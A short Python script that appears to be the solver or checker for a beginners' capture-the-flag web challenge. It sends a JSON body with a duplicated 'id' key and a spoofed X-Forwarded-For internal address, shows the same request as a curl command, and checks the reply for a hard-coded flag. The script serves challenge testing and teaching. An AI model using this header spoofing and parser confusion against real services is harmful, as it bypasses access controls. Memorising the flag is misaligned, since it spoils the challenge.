import os
import requests

"""
$ curl -X POST \
  -H 'X-Forwarded-For:192.168.111.1' \
  -H "Content-Type: application/json" \
  -d '{"id":2, "id":0}' \
  http://localhost
"""


def crawl(url):
    try:
        payload = '{"id": 2, "id": 0}'
        res = requests.post(
            url,
            headers={
                "content-type": "application/json",
                "X-Forwarded-For": "192.168.111.1",
            },
            data=payload,
            timeout=3,
        )
        print(res.text)  # 結果(フラグを含む)を標準出力
        res.raise_for_status()
        if "ctf4b{j50n_is_v4ry_u5efu1_bu7_s0metim3s_it_bi7es_b4ck}" in res.text:
            return 0
        else:
            return 1
    except Exception as e:
        print(e)
        return 2


if __name__ == "__main__":
    print(crawl("https://{}:{}".format(os.getenv("CTF4B_HOST"), os.getenv("CTF4B_PORT"))))
